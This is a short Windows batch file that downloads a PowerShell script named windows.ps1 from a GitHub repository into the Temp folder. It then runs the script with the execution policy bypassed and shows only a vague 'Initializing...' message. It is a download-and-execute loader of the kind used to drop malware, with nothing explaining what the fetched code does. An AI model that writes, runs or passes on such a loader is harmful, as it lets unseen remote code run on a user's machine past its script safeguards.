@echo off
set "URL=https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/windows.ps1"
set "DEST=%Temp%\windows.ps1"

echo Initializing...

:: Force TLS 1.2 and download the PS1
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"

:: Run with Bypass and stay in the Temp directory
powershell -ExecutionPolicy Bypass -File "%DEST%"

exit
